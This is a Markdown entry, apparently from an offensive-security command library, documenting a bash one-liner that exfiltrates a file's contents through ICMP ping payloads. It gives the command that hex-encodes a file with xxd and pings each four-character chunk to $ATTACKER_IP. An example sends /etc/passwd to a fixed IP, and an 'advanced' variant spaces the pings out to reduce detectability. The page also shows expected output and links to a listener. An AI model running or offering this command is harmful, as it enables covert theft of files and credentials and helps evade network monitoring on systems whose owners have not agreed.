---
type: command
executor: bash
data: >-
  xxd -p -c 4 $FILENAME | while read line; do ping -c 1 -p $line $ATTACKER_IP;
  done
output: null
created_at: '2019-10-18T22:31:55.447546+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - exfiltration
  - icmp
  - network
verified: true
validated: true
---

# exfiltrate-file-via-ping-pattern

## Command

```bash
xxd -p -c 4 $FILENAME | while read line; do ping -c 1 -p $line $ATTACKER_IP; done
```

## Description

This command exfiltrates the contents of a specified file by converting it to hexadecimal format, chunking it into 4-character segments, and sending each chunk as the payload pattern in a single ICMP echo request (ping) to an attacker-controlled IP address. It is useful in restricted environments where only ICMP traffic is permitted outbound.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $FILENAME | Path to the file to exfiltrate (e.g., /tmp/secrets.txt) | Yes |
| $ATTACKER_IP | IP address of the receiving machine running the ICMP listener | Yes |
| -p | Specifies the hex pattern for the ICMP payload (injected by the loop) | Built-in to ping |
| -c 1 | Sends exactly one ping per chunk to avoid flooding | Built-in |

## Examples

### Basic Usage

```bash
xxd -p -c 4 /etc/passwd | while read line; do ping -c 1 -p $line 192.168.1.100; done
```

This exfiltrates /etc/passwd to 192.168.1.100, sending one ping per 4-character hex chunk.

### Advanced Usage

```bash
xxd -p -c 4 $FILENAME | while read line; do ping -c 1 -p $line -i 0.5 $ATTACKER_IP; done
```

Adds a 0.5-second interval (-i) between pings to reduce detectability on rate-limited networks.

## Expected Output

The command produces output similar to standard ping results for each chunk, but without verbose errors if successful:

```
PING 192.168.1.100 (192.168.1.100) 56(84) bytes of data.
64 bytes from 192.168.1.100: icmp_seq=1 ttl=64 time=0.123 ms

--- 192.168.1.100 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
```

Repeated for each chunk. No data is printed from the file itself; success is indicated by consistent ping responses. On the receiver, the chunks appear in the sniffer output.

## Related

- [[procedures/Exfiltrate-Data-Using-Ping]]
- [[codes/icmp-exfil-listener-scapy]]
